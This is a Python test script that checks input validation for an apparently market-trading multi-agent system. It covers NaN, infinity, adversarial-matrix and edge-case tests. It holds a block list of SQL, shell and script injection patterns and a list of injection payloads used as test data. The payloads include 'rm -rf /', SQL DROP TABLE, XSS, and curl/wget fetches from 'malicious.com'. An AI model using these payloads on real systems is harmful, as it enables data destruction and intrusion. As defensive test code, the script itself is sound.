#!/usr/bin/env python3
"""
AGENT 4 RED TEAM CERTIFIER: Input Validation & Adversarial Perturbation Testing
Mission: Aegis - Tactical MARL Final Security Validation

This test validates that the tactical MARL system properly handles
malicious input data and adversarial perturbations.

🎯 OBJECTIVE: Inject NaN, Inf, adversarial perturbations - verify all are rejected

SECURITY REQUIREMENTS:
- System must reject NaN values in all input data
- System must reject Infinite values in all input data  
- System must sanitize all string inputs
- System must validate all numerical ranges
- System must resist adversarial perturbations designed to trigger exploits
- System must maintain stability under all malicious inputs
"""

import asyncio
import time
import uuid
import json
import logging
import math
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
import numpy as np

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class InputValidationTestResult:
    """Results from input validation testing."""
    test_name: str
    total_tests: int
    passed_tests: int
    failed_tests: int
    errors: List[str]
    processing_times: List[float]
    
    @property
    def success_rate(self) -> float:
        """Calculate success rate."""
        if self.total_tests == 0:
            return 0.0
        return self.passed_tests / self.total_tests

class TacticalInputValidator:
    """
    Input validation system for tactical MARL components.
    
    This class implements robust input validation that should reject
    all malicious or malformed input data.
    """
    
    def __init__(self):
        self.validation_errors = []
        
    def validate_matrix_state(self, matrix_state: Any) -> Tuple[bool, str]:
        """
        Validate matrix state input.
        
        Expected format: List[List[float]] representing 60×7 matrix
        """
        try:
            # Type validation
            if not isinstance(matrix_state, (list, np.ndarray)):
                return False, f"Matrix must be list or numpy array, got {type(matrix_state)}"
            
            # Convert to numpy for validation
            if isinstance(matrix_state, list):
                try:
                    matrix_array = np.array(matrix_state, dtype=np.float32)
                except (ValueError, TypeError) as e:
                    return False, f"Cannot convert to numpy array: {e}"
            else:
                matrix_array = matrix_state
            
            # Shape validation
            if matrix_array.ndim != 2:
                return False, f"Matrix must be 2D, got {matrix_array.ndim}D"
            
            if matrix_array.shape != (60, 7):
                return False, f"Matrix must be 60×7, got {matrix_array.shape}"
            
            # NaN validation
            if np.isnan(matrix_array).any():
                nan_positions = np.where(np.isnan(matrix_array))
                return False, f"Matrix contains NaN values at positions: {list(zip(nan_positions[0], nan_positions[1]))[:5]}"
            
            # Infinity validation
            if np.isinf(matrix_array).any():
                inf_positions = np.where(np.isinf(matrix_array))
                return False, f"Matrix contains Inf values at positions: {list(zip(inf_positions[0], inf_positions[1]))[:5]}"
            
            # Range validation (reasonable market data ranges)
            if np.any(np.abs(matrix_array) > 1e6):
                extreme_positions = np.where(np.abs(matrix_array) > 1e6)
                return False, f"Matrix contains extreme values at positions: {list(zip(extreme_positions[0], extreme_positions[1]))[:5]}"
            
            # Statistical validation - detect adversarial patterns
            if self._detect_adversarial_patterns(matrix_array):
                return False, "Adversarial pattern detected in matrix data"
            
            return True, "Valid matrix"
            
        except Exception as e:
            return False, f"Validation error: {e}"
    
    def validate_synergy_event(self, event_data: Any) -> Tuple[bool, str]:
        """
        Validate synergy event input.
        """
        try:
            # Type validation
            if not isinstance(event_data, dict):
                return False, f"Event must be dictionary, got {type(event_data)}"
            
            # Required fields
            required_fields = ['synergy_type', 'direction', 'confidence', 'correlation_id']
            for field in required_fields:
                if field not in event_data:
                    return False, f"Missing required field: {field}"
            
            # Synergy type validation
            synergy_type = event_data['synergy_type']
            if not isinstance(synergy_type, str):
                return False, f"synergy_type must be string, got {type(synergy_type)}"
            
            if len(synergy_type) > 100:
                return False, f"synergy_type too long: {len(synergy_type)} > 100"
            
            # Check for injection attacks
            if self._contains_injection_patterns(synergy_type):
                return False, f"synergy_type contains suspicious patterns: {synergy_type}"
            
            # Direction validation
            direction = event_data['direction']
            if not isinstance(direction, (int, float)):
                return False, f"direction must be numeric, got {type(direction)}"
            
            if math.isnan(direction) or math.isinf(direction):
                return False, f"direction contains invalid value: {direction}"
            
            if direction not in [-1, 0, 1]:
                return False, f"direction must be -1, 0, or 1, got {direction}"
            
            # Confidence validation
            confidence = event_data['confidence']
            if not isinstance(confidence, (int, float)):
                return False, f"confidence must be numeric, got {type(confidence)}"
            
            if math.isnan(confidence) or math.isinf(confidence):
                return False, f"confidence contains invalid value: {confidence}"
            
            if not (0.0 <= confidence <= 1.0):
                return False, f"confidence must be in [0,1], got {confidence}"
            
            # Correlation ID validation
            correlation_id = event_data['correlation_id']
            if not isinstance(correlation_id, str):
                return False, f"correlation_id must be string, got {type(correlation_id)}"
            
            if len(correlation_id) > 200:
                return False, f"correlation_id too long: {len(correlation_id)}"
            
            if self._contains_injection_patterns(correlation_id):
                return False, f"correlation_id contains suspicious patterns"
            
            # Validate optional fields if present
            if 'signal_sequence' in event_data:
                if not isinstance(event_data['signal_sequence'], list):
                    return False, "signal_sequence must be list"
                
                if len(event_data['signal_sequence']) > 1000:
                    return False, f"signal_sequence too large: {len(event_data['signal_sequence'])}"
            
            if 'market_context' in event_data:
                if not isinstance(event_data['market_context'], dict):
                    return False, "market_context must be dict"
                
                # Validate market context recursively
                valid, msg = self._validate_dict_recursively(event_data['market_context'], max_depth=3)
                if not valid:
                    return False, f"market_context validation failed: {msg}"
            
            return True, "Valid synergy event"
            
        except Exception as e:
            return False, f"Validation error: {e}"
    
    def validate_decision_request(self, request_data: Any) -> Tuple[bool, str]:
        """
        Validate decision request input.
        """
        try:
            if not isinstance(request_data, dict):
                return False, f"Request must be dictionary, got {type(request_data)}"
            
            # Validate matrix state if present
            if 'matrix_state' in request_data:
                valid, msg = self.validate_matrix_state(request_data['matrix_state'])
                if not valid:
                    return False, f"matrix_state validation failed: {msg}"
            
            # Validate synergy context if present
            if 'synergy_context' in request_data:
                valid, msg = self.validate_synergy_event(request_data['synergy_context'])
                if not valid:
                    return False, f"synergy_context validation failed: {msg}"
            
            # Validate override params if present
            if 'override_params' in request_data:
                if not isinstance(request_data['override_params'], dict):
                    return False, "override_params must be dict"
                
                valid, msg = self._validate_dict_recursively(request_data['override_params'], max_depth=2)
                if not valid:
                    return False, f"override_params validation failed: {msg}"
            
            # Validate correlation_id if present
            if 'correlation_id' in request_data:
                correlation_id = request_data['correlation_id']
                if not isinstance(correlation_id, str):
                    return False, f"correlation_id must be string, got {type(correlation_id)}"
                
                if len(correlation_id) > 200:
                    return False, f"correlation_id too long: {len(correlation_id)}"
                
                if self._contains_injection_patterns(correlation_id):
                    return False, "correlation_id contains suspicious patterns"
            
            return True, "Valid decision request"
            
        except Exception as e:
            return False, f"Validation error: {e}"
    
    def _detect_adversarial_patterns(self, matrix: np.ndarray) -> bool:
        """
        Detect adversarial patterns in matrix data.
        
        These patterns might be used to exploit model vulnerabilities:
        1. All identical values (replay attack)
        2. Checkerboard patterns (gradient confusion)
        3. Extreme gradient changes (gradient explosion trigger)
        4. Repeating sine waves (periodicity exploit)
        """
        try:
            # Pattern 1: All identical values
            if np.all(matrix == matrix[0, 0]):
                logger.warning("Adversarial pattern detected: All identical values")
                return True
            
            # Pattern 2: Checkerboard pattern
            checkerboard = np.zeros_like(matrix)
            checkerboard[::2, ::2] = 1
            checkerboard[1::2, 1::2] = 1
            correlation = np.corrcoef(matrix.flatten(), checkerboard.flatten())[0, 1]
            if not np.isnan(correlation) and abs(correlation) > 0.9:
                logger.warning("Adversarial pattern detected: Checkerboard pattern")
                return True
            
            # Pattern 3: Extreme gradient changes
            gradients = np.gradient(matrix)
            if np.any(np.abs(gradients[0]) > 1000) or np.any(np.abs(gradients[1]) > 1000):
                logger.warning("Adversarial pattern detected: Extreme gradients")
                return True
            
            # Pattern 4: Perfect sine wave (too artificial)
            for i in range(matrix.shape[1]):
                column = matrix[:, i]
                x = np.arange(len(column))
                # Try to fit a sine wave
                try:
                    # Simple sine wave correlation check
                    sine_wave = np.sin(2 * np.pi * x / 10)
                    correlation = np.corrcoef(column, sine_wave)[0, 1]
                    if not np.isnan(correlation) and abs(correlation) > 0.95:
                        logger.warning("Adversarial pattern detected: Perfect sine wave")
                        return True
                except (ValueError, TypeError, AttributeError) as e:
                    logger.error(f'Error occurred: {e}')
            
            # Pattern 5: Suspicious statistical properties
            if np.std(matrix) < 1e-10:  # Too little variance
                logger.warning("Adversarial pattern detected: Zero variance")
                return True
            
            if np.std(matrix) > 1e4:  # Too much variance
                logger.warning("Adversarial pattern detected: Extreme variance")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Error detecting adversarial patterns: {e}")
            return True  # Err on the side of caution
    
    def _contains_injection_patterns(self, text: str) -> bool:
        """
        Check for common injection attack patterns.
        """
        if not isinstance(text, str):
            return True
        
        # SQL injection patterns
        sql_patterns = [
            "' OR '1'='1", "'; DROP TABLE", "UNION SELECT", "/* */", "-- ",
            "1=1", "1' OR '1'='1", "admin'--", "admin'/*"
        ]
        
        # Command injection patterns  
        cmd_patterns = [
            "; ls", "; cat", "| cat", "$(", "`", "&& rm", "|| rm",
            "; rm", "; wget", "; curl", "; python", "; bash"
        ]
        
        # Script injection patterns
        script_patterns = [
            "<script>", "</script>", "javascript:", "eval(", "alert(",
            "document.cookie", "window.location", "innerHTML"
        ]
        
        # Redis/NoSQL injection patterns
        nosql_patterns = [
            "||", "&&", "$ne", "$gt", "$lt", "$regex", "$where"
        ]
        
        text_lower = text.lower()
        
        all_patterns = sql_patterns + cmd_patterns + script_patterns + nosql_patterns
        
        for pattern in all_patterns:
            if pattern.lower() in text_lower:
                return True
        
        # Check for excessive special characters
        special_chars = sum(1 for c in text if not c.isalnum() and c not in ['-', '_', '.', ' '])
        if special_chars > len(text) * 0.3:  # More than 30% special chars
            return True
        
        return False
    
    def _validate_dict_recursively(self, data: dict, max_depth: int, current_depth: int = 0) -> Tuple[bool, str]:
        """
        Recursively validate dictionary data.
        """
        if current_depth > max_depth:
            return False, f"Dictionary nesting too deep: {current_depth} > {max_depth}"
        
        if len(data) > 100:
            return False, f"Dictionary too large: {len(data)} keys"
        
        for key, value in data.items():
            # Validate key
            if not isinstance(key, str):
                return False, f"Dictionary key must be string, got {type(key)}"
            
            if len(key) > 100:
                return False, f"Dictionary key too long: {len(key)}"
            
            if self._contains_injection_patterns(key):
                return False, f"Dictionary key contains suspicious patterns: {key}"
            
            # Validate value
            if isinstance(value, dict):
                valid, msg = self._validate_dict_recursively(value, max_depth, current_depth + 1)
                if not valid:
                    return False, msg
            elif isinstance(value, (int, float)):
                if math.isnan(value) or math.isinf(value):
                    return False, f"Dictionary value contains invalid number: {value}"
            elif isinstance(value, str):
                if len(value) > 1000:
                    return False, f"Dictionary string value too long: {len(value)}"
                if self._contains_injection_patterns(value):
                    return False, f"Dictionary value contains suspicious patterns"
            elif isinstance(value, list):
                if len(value) > 1000:
                    return False, f"Dictionary list too long: {len(value)}"
                # Basic validation for list elements
                for i, item in enumerate(value[:10]):  # Check first 10 items
                    if isinstance(item, (int, float)) and (math.isnan(item) or math.isinf(item)):
                        return False, f"List item {i} contains invalid number: {item}"
        
        return True, "Valid dictionary"

class InputValidationTester:
    """Comprehensive input validation testing suite."""
    
    def __init__(self):
        self.validator = TacticalInputValidator()
        self.test_results = []
    
    async def test_nan_injection(self) -> InputValidationTestResult:
        """
        🧪 TEST: NaN Injection Attack
        
        Attempts to inject NaN values in various input fields.
        """
        logger.info("🧪 Testing NaN injection attacks...")
        
        passed = 0
        failed = 0
        errors = []
        processing_times = []
        
        # Test cases with NaN values
        test_cases = [
            # Matrix with NaN values
            {
                "name": "Matrix with NaN",
                "input": np.full((60, 7), np.nan),
                "validator": "validate_matrix_state"
            },
            {
                "name": "Matrix with single NaN",
                "input": np.zeros((60, 7)),
                "validator": "validate_matrix_state",
                "modify": lambda x: x.__setitem__((30, 3), np.nan)
            },
            # Synergy event with NaN values
            {
                "name": "Event with NaN confidence",
                "input": {
                    "synergy_type": "test",
                    "direction": 1,
                    "confidence": np.nan,
                    "correlation_id": "test_123"
                },
                "validator": "validate_synergy_event"
            },
            {
                "name": "Event with NaN direction",
                "input": {
                    "synergy_type": "test",
                    "direction": np.nan,
                    "confidence": 0.8,
                    "correlation_id": "test_123"
                },
                "validator": "validate_synergy_event"
            },
            # Decision request with NaN values
            {
                "name": "Decision request with NaN matrix",
                "input": {
                    "matrix_state": np.full((60, 7), np.nan).tolist(),
                    "correlation_id": "test_123"
                },
                "validator": "validate_decision_request"
            }
        ]
        
        for test_case in test_cases:
            start_time = time.perf_counter()
            
            try:
                # Prepare input
                input_data = test_case["input"]
                if "modify" in test_case:
                    test_case["modify"](input_data)
                
                # Run validation
                validator_method = getattr(self.validator, test_case["validator"])
                is_valid, message = validator_method(input_data)
                
                processing_time = time.perf_counter() - start_time
                processing_times.append(processing_time)
                
                # Check result (should be invalid)
                if not is_valid:
                    passed += 1
                    logger.info(f"✅ {test_case['name']}: Correctly rejected - {message}")
                else:
                    failed += 1
                    errors.append(f"{test_case['name']}: Should have been rejected but was accepted")
                    logger.error(f"❌ {test_case['name']}: Should have been rejected but was accepted")
                
            except Exception as e:
                processing_time = time.perf_counter() - start_time
                processing_times.append(processing_time)
                
                # Exception is acceptable for malicious input
                passed += 1
                logger.info(f"✅ {test_case['name']}: Correctly threw exception - {e}")
        
        total_tests = len(test_cases)
        
        return InputValidationTestResult(
            test_name="NaN Injection",
            total_tests=total_tests,
            passed_tests=passed,
            failed_tests=failed,
            errors=errors,
            processing_times=processing_times
        )
    
    async def test_infinity_injection(self) -> InputValidationTestResult:
        """
        🧪 TEST: Infinity Injection Attack
        
        Attempts to inject infinite values in various input fields.
        """
        logger.info("🧪 Testing Infinity injection attacks...")
        
        passed = 0
        failed = 0
        errors = []
        processing_times = []
        
        # Test cases with infinity values
        test_cases = [
            # Matrix with infinity values
            {
                "name": "Matrix with positive infinity",
                "input": np.full((60, 7), np.inf),
                "validator": "validate_matrix_state"
            },
            {
                "name": "Matrix with negative infinity",
                "input": np.full((60, 7), -np.inf),
                "validator": "validate_matrix_state"
            },
            {
                "name": "Matrix with single infinity",
                "input": np.zeros((60, 7)),
                "validator": "validate_matrix_state",
                "modify": lambda x: x.__setitem__((15, 2), np.inf)
            },
            # Synergy event with infinity values
            {
                "name": "Event with infinite confidence",
                "input": {
                    "synergy_type": "test",
                    "direction": 1,
                    "confidence": np.inf,
                    "correlation_id": "test_123"
                },
                "validator": "validate_synergy_event"
            },
            {
                "name": "Event with negative infinite direction",
                "input": {
                    "synergy_type": "test",
                    "direction": -np.inf,
                    "confidence": 0.8,
                    "correlation_id": "test_123"
                },
                "validator": "validate_synergy_event"
            }
        ]
        
        for test_case in test_cases:
            start_time = time.perf_counter()
            
            try:
                # Prepare input
                input_data = test_case["input"]
                if "modify" in test_case:
                    test_case["modify"](input_data)
                
                # Run validation
                validator_method = getattr(self.validator, test_case["validator"])
                is_valid, message = validator_method(input_data)
                
                processing_time = time.perf_counter() - start_time
                processing_times.append(processing_time)
                
                # Check result (should be invalid)
                if not is_valid:
                    passed += 1
                    logger.info(f"✅ {test_case['name']}: Correctly rejected - {message}")
                else:
                    failed += 1
                    errors.append(f"{test_case['name']}: Should have been rejected but was accepted")
                    logger.error(f"❌ {test_case['name']}: Should have been rejected but was accepted")
                
            except Exception as e:
                processing_time = time.perf_counter() - start_time
                processing_times.append(processing_time)
                
                # Exception is acceptable for malicious input
                passed += 1
                logger.info(f"✅ {test_case['name']}: Correctly threw exception - {e}")
        
        total_tests = len(test_cases)
        
        return InputValidationTestResult(
            test_name="Infinity Injection",
            total_tests=total_tests,
            passed_tests=passed,
            failed_tests=failed,
            errors=errors,
            processing_times=processing_times
        )
    
    async def test_injection_attacks(self) -> InputValidationTestResult:
        """
        🧪 TEST: SQL/Command/Script Injection Attacks
        
        Attempts various injection attack patterns.
        """
        logger.info("🧪 Testing injection attacks...")
        
        passed = 0
        failed = 0
        errors = []
        processing_times = []
        
        # Malicious payloads
        injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'/*",
            "; rm -rf /",
            "$(curl malicious.com)",
            "`rm -rf /`",
            "&& wget malicious.com/script.sh",
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "eval('malicious_code')",
            "$ne: null",
            "$where: 'this.password.length > 0'",
            "||this.constructor.constructor('return process')().exit()||",
            "\"; system('rm -rf /'); \"",
        ]
        
        # Test injection in various fields
        for payload in injection_payloads:
            # Test in synergy_type
            test_case = {
                "name": f"Injection in synergy_type: {payload[:20]}...",
                "input": {
                    "synergy_type": payload,
                    "direction": 1,
                    "confidence": 0.8,
                    "correlation_id": "test_123"
                },
                "validator": "validate_synergy_event"
            }
            
            start_time = time.perf_counter()
            
            try:
                validator_method = getattr(self.validator, test_case["validator"])
                is_valid, message = validator_method(test_case["input"])
                
                processing_time = time.perf_counter() - start_time
                processing_times.append(processing_time)
                
                if not is_valid:
                    passed += 1
                    logger.info(f"✅ {test_case['name']}: Correctly rejected")
                else:
                    failed += 1
                    errors.append(f"{test_case['name']}: Should have been rejected")
                    logger.error(f"❌ {test_case['name']}: Should have been rejected")
                
            except Exception as e:
                processing_time = time.perf_counter() - start_time
                processing_times.append(processing_time)
                
                passed += 1
                logger.info(f"✅ {test_case['name']}: Correctly threw exception")
            
            # Test in correlation_id
            test_case = {
                "name": f"Injection in correlation_id: {payload[:20]}...",
                "input": {
                    "synergy_type": "test",
                    "direction": 1,
                    "confidence": 0.8,
                    "correlation_id": payload
                },
                "validator": "validate_synergy_event"
            }
            
            start_time = time.perf_counter()
            
            try:
                validator_method = getattr(self.validator, test_case["validator"])
                is_valid, message = validator_method(test_case["input"])
                
                processing_time = time.perf_counter() - start_time
                processing_times.append(processing_time)
                
                if not is_valid:
                    passed += 1
                    logger.info(f"✅ {test_case['name']}: Correctly rejected")
                else:
                    failed += 1
                    errors.append(f"{test_case['name']}: Should have been rejected")
                    logger.error(f"❌ {test_case['name']}: Should have been rejected")
                
            except Exception as e:
                processing_time = time.perf_counter() - start_time
                processing_times.append(processing_time)
                
                passed += 1
                logger.info(f"✅ {test_case['name']}: Correctly threw exception")
        
        total_tests = len(injection_payloads) * 2  # Test each payload in 2 fields
        
        return InputValidationTestResult(
            test_name="Injection Attacks",
            total_tests=total_tests,
            passed_tests=passed,
            failed_tests=failed,
            errors=errors,
            processing_times=processing_times
        )
    
    async def test_adversarial_patterns(self) -> InputValidationTestResult:
        """
        🧪 TEST: Adversarial Pattern Detection
        
        Tests detection of adversarial patterns in matrix data.
        """
        logger.info("🧪 Testing adversarial pattern detection...")
        
        passed = 0
        failed = 0
        errors = []
        processing_times = []
        
        # Generate adversarial patterns
        test_cases = []
        
        # Pattern 1: All identical values
        identical_matrix = np.full((60, 7), 42.0)
        test_cases.append(("All identical values", identical_matrix))
        
        # Pattern 2: Checkerboard pattern
        checkerboard = np.zeros((60, 7))
        checkerboard[::2, ::2] = 100
        checkerboard[1::2, 1::2] = 100
        test_cases.append(("Checkerboard pattern", checkerboard))
        
        # Pattern 3: Extreme gradients
        extreme_gradient = np.zeros((60, 7))
        extreme_gradient[30, :] = 10000  # Spike
        test_cases.append(("Extreme gradient", extreme_gradient))
        
        # Pattern 4: Perfect sine wave
        sine_matrix = np.zeros((60, 7))
        x = np.arange(60)
        for col in range(7):
            sine_matrix[:, col] = np.sin(2 * np.pi * x / 10)
        test_cases.append(("Perfect sine wave", sine_matrix))
        
        # Pattern 5: Zero variance
        zero_variance = np.full((60, 7), 1.0)
        test_cases.append(("Zero variance", zero_variance))
        
        # Pattern 6: Extreme variance
        extreme_variance = np.random.normal(0, 10000, (60, 7))
        test_cases.append(("Extreme variance", extreme_variance))
        
        for pattern_name, matrix in test_cases:
            start_time = time.perf_counter()
            
            try:
                is_valid, message = self.validator.validate_matrix_state(matrix)
                
                processing_time = time.perf_counter() - start_time
                processing_times.append(processing_time)
                
                if not is_valid:
                    passed += 1
                    logger.info(f"✅ {pattern_name}: Correctly detected as adversarial - {message}")
                else:
                    failed += 1
                    errors.append(f"{pattern_name}: Should have been detected as adversarial")
                    logger.error(f"❌ {pattern_name}: Should have been detected as adversarial")
                
            except Exception as e:
                processing_time = time.perf_counter() - start_time
                processing_times.append(processing_time)
                
                passed += 1
                logger.info(f"✅ {pattern_name}: Correctly threw exception - {e}")
        
        total_tests = len(test_cases)
        
        return InputValidationTestResult(
            test_name="Adversarial Patterns",
            total_tests=total_tests,
            passed_tests=passed,
            failed_tests=failed,
            errors=errors,
            processing_times=processing_times
        )
    
    async def test_edge_cases(self) -> InputValidationTestResult:
        """
        🧪 TEST: Edge Cases and Boundary Conditions
        
        Tests various edge cases and boundary conditions.
        """
        logger.info("🧪 Testing edge cases...")
        
        passed = 0
        failed = 0
        errors = []
        processing_times = []
        
        test_cases = [
            # Wrong data types
            {
                "name": "Matrix as string",
                "input": "not_a_matrix",
                "validator": "validate_matrix_state",
                "should_pass": False
            },
            {
                "name": "Event as list",
                "input": ["not", "a", "dict"],
                "validator": "validate_synergy_event",
                "should_pass": False
            },
            # Wrong shapes
            {
                "name": "Wrong matrix shape (50×7)",
                "input": np.zeros((50, 7)),
                "validator": "validate_matrix_state",
                "should_pass": False
            },
            {
                "name": "Wrong matrix shape (60×8)",
                "input": np.zeros((60, 8)),
                "validator": "validate_matrix_state",
                "should_pass": False
            },
            {
                "name": "1D matrix",
                "input": np.zeros(60),
                "validator": "validate_matrix_state",
                "should_pass": False
            },
            # Missing required fields
            {
                "name": "Event missing synergy_type",
                "input": {
                    "direction": 1,
                    "confidence": 0.8,
                    "correlation_id": "test"
                },
                "validator": "validate_synergy_event",
                "should_pass": False
            },
            # Invalid ranges
            {
                "name": "Event confidence > 1",
                "input": {
                    "synergy_type": "test",
                    "direction": 1,
                    "confidence": 1.5,
                    "correlation_id": "test"
                },
                "validator": "validate_synergy_event",
                "should_pass": False
            },
            {
                "name": "Event confidence < 0",
                "input": {
                    "synergy_type": "test",
                    "direction": 1,
                    "confidence": -0.5,
                    "correlation_id": "test"
                },
                "validator": "validate_synergy_event",
                "should_pass": False
            },
            {
                "name": "Event direction invalid",
                "input": {
                    "synergy_type": "test",
                    "direction": 5,
                    "confidence": 0.8,
                    "correlation_id": "test"
                },
                "validator": "validate_synergy_event",
                "should_pass": False
            },
            # Too large inputs
            {
                "name": "Too long synergy_type",
                "input": {
                    "synergy_type": "x" * 1000,
                    "direction": 1,
                    "confidence": 0.8,
                    "correlation_id": "test"
                },
                "validator": "validate_synergy_event",
                "should_pass": False
            },
            {
                "name": "Too long correlation_id",
                "input": {
                    "synergy_type": "test",
                    "direction": 1,
                    "confidence": 0.8,
                    "correlation_id": "x" * 1000
                },
                "validator": "validate_synergy_event",
                "should_pass": False
            },
            # Valid cases (should pass)
            {
                "name": "Valid matrix",
                "input": np.random.randn(60, 7),
                "validator": "validate_matrix_state",
                "should_pass": True
            },
            {
                "name": "Valid event",
                "input": {
                    "synergy_type": "test_breakout",
                    "direction": 1,
                    "confidence": 0.75,
                    "correlation_id": "test_12345"
                },
                "validator": "validate_synergy_event",
                "should_pass": True
            }
        ]
        
        for test_case in test_cases:
            start_time = time.perf_counter()
            
            try:
                validator_method = getattr(self.validator, test_case["validator"])
                is_valid, message = validator_method(test_case["input"])
                
                processing_time = time.perf_counter() - start_time
                processing_times.append(processing_time)
                
                if is_valid == test_case["should_pass"]:
                    passed += 1
                    logger.info(f"✅ {test_case['name']}: {'Accepted' if is_valid else 'Rejected'} as expected")
                else:
                    failed += 1
                    expected = "accepted" if test_case["should_pass"] else "rejected"
                    actual = "accepted" if is_valid else "rejected"
                    errors.append(f"{test_case['name']}: Expected {expected}, got {actual}")
                    logger.error(f"❌ {test_case['name']}: Expected {expected}, got {actual}")
                
            except Exception as e:
                processing_time = time.perf_counter() - start_time
                processing_times.append(processing_time)
                
                if test_case["should_pass"]:
                    failed += 1
                    errors.append(f"{test_case['name']}: Valid input threw exception: {e}")
                    logger.error(f"❌ {test_case['name']}: Valid input threw exception: {e}")
                else:
                    passed += 1
                    logger.info(f"✅ {test_case['name']}: Invalid input correctly threw exception")
        
        total_tests = len(test_cases)
        
        return InputValidationTestResult(
            test_name="Edge Cases",
            total_tests=total_tests,
            passed_tests=passed,
            failed_tests=failed,
            errors=errors,
            processing_times=processing_times
        )

async def run_comprehensive_input_validation_tests():
    """Run all input validation tests."""
    
    logger.info("🚨 STARTING COMPREHENSIVE INPUT VALIDATION TESTING")
    logger.info("=" * 80)
    
    tester = InputValidationTester()
    
    # Run all test suites
    test_results = []
    
    # Test 1: NaN injection
    logger.info("🧪 TEST SUITE 1: NaN Injection Attacks")
    result1 = await tester.test_nan_injection()
    test_results.append(result1)
    
    # Test 2: Infinity injection  
    logger.info("\n🧪 TEST SUITE 2: Infinity Injection Attacks")
    result2 = await tester.test_infinity_injection()
    test_results.append(result2)
    
    # Test 3: Injection attacks
    logger.info("\n🧪 TEST SUITE 3: Code Injection Attacks")
    result3 = await tester.test_injection_attacks()
    test_results.append(result3)
    
    # Test 4: Adversarial patterns
    logger.info("\n🧪 TEST SUITE 4: Adversarial Pattern Detection")
    result4 = await tester.test_adversarial_patterns()
    test_results.append(result4)
    
    # Test 5: Edge cases
    logger.info("\n🧪 TEST SUITE 5: Edge Cases and Boundary Conditions")
    result5 = await tester.test_edge_cases()
    test_results.append(result5)
    
    # Compile final results
    logger.info("\n" + "="*80)
    logger.info("🏆 FINAL INPUT VALIDATION TEST RESULTS")
    logger.info("="*80)
    
    total_tests = sum(r.total_tests for r in test_results)
    total_passed = sum(r.passed_tests for r in test_results)
    total_failed = sum(r.failed_tests for r in test_results)
    overall_success_rate = total_passed / total_tests if total_tests > 0 else 0
    
    all_processing_times = []
    for r in test_results:
        all_processing_times.extend(r.processing_times)
    
    avg_processing_time = sum(all_processing_times) / len(all_processing_times) if all_processing_times else 0
    max_processing_time = max(all_processing_times) if all_processing_times else 0
    
    for result in test_results:
        status = "PASS" if result.success_rate >= 0.95 else "FAIL"
        logger.info(f"✅ {result.test_name}: {status} ({result.passed_tests}/{result.total_tests}, {result.success_rate*100:.1f}%)")
    
    overall_pass = overall_success_rate >= 0.95
    
    logger.info(f"\n📊 OVERALL STATISTICS:")
    logger.info(f"   Total tests: {total_tests}")
    logger.info(f"   Total passed: {total_passed}")
    logger.info(f"   Total failed: {total_failed}")
    logger.info(f"   Success rate: {overall_success_rate*100:.1f}%")
    logger.info(f"   Avg processing time: {avg_processing_time*1000:.2f}ms")
    logger.info(f"   Max processing time: {max_processing_time*1000:.2f}ms")
    
    logger.info(f"\n🎯 OVERALL RESULT: {'PASS' if overall_pass else 'FAIL'}")
    
    if overall_pass:
        logger.info("🛡️ INPUT VALIDATION: SYSTEM IS BULLETPROOF")
    else:
        logger.error("🚨 INPUT VALIDATION: VULNERABILITIES DETECTED")
        for result in test_results:
            if result.errors:
                logger.error(f"   {result.test_name} errors:")
                for error in result.errors[:3]:  # Show first 3 errors
                    logger.error(f"     - {error}")
    
    return {
        "test_results": test_results,
        "overall_pass": overall_pass,
        "overall_success_rate": overall_success_rate,
        "total_tests": total_tests,
        "avg_processing_time_ms": avg_processing_time * 1000,
        "max_processing_time_ms": max_processing_time * 1000
    }

if __name__ == "__main__":
    # Run the tests
    asyncio.run(run_comprehensive_input_validation_tests())